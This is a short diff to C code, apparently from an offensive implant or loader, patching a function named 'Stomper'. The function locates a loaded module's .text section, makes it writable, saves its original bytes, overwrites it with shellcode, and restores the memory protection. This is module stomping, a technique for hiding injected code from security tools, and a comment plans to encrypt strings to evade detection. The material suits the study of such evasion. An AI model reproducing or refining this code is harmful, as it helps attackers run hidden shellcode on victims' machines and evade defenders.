@@ -53,7 +53,7 @@ VOID Stomper(
 
     SecHdr = IMAGE_FIRST_SECTION( Header );
     for ( ULONG i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
-        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) { //todo: encrypt string ".text"
+        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) { // todo: encrypt string ".text"
             break;
         }
     }
@@ -75,7 +75,7 @@ VOID Stomper(
 
     Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, &Protect );
     
-    MmCopy( StompArgs.Backup, ShellcodeBuffer, StompArgs.Length );
+    MmCopy( StompArgs.Backup, MmBase, StompArgs.Length );
     MmCopy( MmBase, ShellcodeBuffer, ShellcodeSize );
 
     bCheck = Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect );
